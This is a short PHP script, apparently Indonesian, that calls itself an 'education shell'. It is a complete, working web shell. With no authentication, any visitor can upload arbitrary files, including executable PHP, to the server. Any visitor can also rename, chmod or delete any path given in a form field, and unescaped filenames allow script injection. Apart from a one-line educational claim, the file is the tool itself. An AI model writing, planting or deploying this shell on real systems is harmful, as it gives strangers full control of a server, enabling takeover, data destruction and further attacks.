<?php
/**
 * Simple Education Shell
 * Digunakan untuk mempelajari cara kerja file management di web server.
 */

$msg = "";
$current_dir = getcwd();

// Fitur Upload File
if (isset($_FILES['file_upload'])) {
    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $current_dir . '/' . $_FILES['file_upload']['name'])) {
        $msg = "File berhasil diunggah.";
    }
}

// Fitur Aksi: Rename, Chmod, Delete
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $filename = $_POST['filename'];

    if ($action == 'chmod' && !empty($_POST['perm'])) {
        // Chmod menggunakan nilai oktal
        chmod($filename, octdec($_POST['perm']));
        $msg = "Izin file $filename diubah menjadi " . $_POST['perm'];
    } elseif ($action == 'rename' && !empty($_POST['new_name'])) {
        rename($filename, $_POST['new_name']);
        $msg = "Nama file diubah menjadi " . $_POST['new_name'];
    } elseif ($action == 'delete') {
        unlink($filename);
        $msg = "File $filename telah dihapus.";
    }
}

$files = scandir($current_dir);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Edu Shell</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border-bottom: 1px solid #ddd; padding: 10px; text-align: left; }
        .msg { color: green; font-weight: bold; }
    </style>
</head>
<body>
<div class="container">
    <h2>Simple Edu Shell</h2>
    <p>Direktori: <code><?php echo $current_dir; ?></code></p>
    <?php if($msg) echo "<p class='msg'>$msg</p>"; ?>

    <!-- Form Upload -->
    <form method="POST" enctype="multipart/form-data">
        Upload File: <input type="file" name="file_upload"> 
        <input type="submit" value="Upload">
    </form>

    <table>
        <tr>
            <th>Nama File</th>
            <th>Izin (Chmod)</th>
            <th>Aksi</th>
        </tr>
        <?php foreach($files as $f): if($f == "." || $f == "..") continue; ?>
        <tr>
            <td><?php echo $f; ?></td>
            <td><?php echo substr(sprintf('%o', fileperms($f)), -4); ?></td>
            <td>
                <form method="POST" style="display:inline;">
                    <input type="hidden" name="filename" value="<?php echo $f; ?>">
                    <input type="text" name="new_name" placeholder="Nama Baru" size="10">
                    <button name="action" value="rename">Rename</button>
                    
                    <input type="text" name="perm" placeholder="0755" size="4">
                    <button name="action" value="chmod">Chmod</button>
                    
                    <button name="action" value="delete" onclick="return confirm('Hapus?')">Hapus</button>
                </form>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>
</div>
</body>
</html>
